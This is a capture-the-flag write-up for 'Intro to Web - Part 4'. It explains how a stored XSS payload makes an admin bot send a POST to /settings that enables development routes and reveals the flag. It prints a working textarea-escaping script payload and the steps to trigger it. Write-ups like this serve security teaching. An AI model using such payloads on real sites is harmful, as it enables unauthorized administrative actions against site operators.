---
title: "Intro to Web - Part 4"
date: 2025-06-22
description: Admin-context XSS / CSRF triggers an internal POST to /settings, enabling development routes and exposing the flag at /development.
challenge_author: "Not specified"
writeup_author: "sleepyswords & wallsdeep13"
---

**Challenge:** Intro to Web - Part 4

**Goal:** Trigger an internal configuration update to enable development routes and access `/development`.

**Flag:**
- `GPNCTF{...}` - located on the `/development` endpoint

---

## Vulnerability

The application includes an internal management endpoint at `/settings` that accepts JSON POST requests to toggle system features:

```http
POST /settings HTTP/1.1
Content-Type: application/json

{"show_development_routes": true}
```

This endpoint is restricted to authenticated administrators. Leveraging the stored XSS vulnerability from Part 3, we can instruct the administrator's browser to send a background `fetch()` request to `/settings` with the payload enabling development routes.

## Attack Path

### 1. Craft the Admin Action Payload

We construct an XSS payload that issues an authenticated `fetch()` request to `/settings`:

```html
</textarea><script>
fetch('/settings', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({show_development_routes: true})
});
</script><textarea>
```

### 2. Submit Payload via Report Feature

Submit the report containing the payload. When the admin bot views the report, their browser triggers the internal POST request to `/settings`, enabling development routes server-wide.

### 3. Access /development

Navigate to `/development` to view the development dashboard and retrieve the flag.

---

## Notes

- Sensitive administrative actions should enforce CSRF tokens, origin validation, and strict Content Security Policies (CSP) to mitigate the impact of script injection.
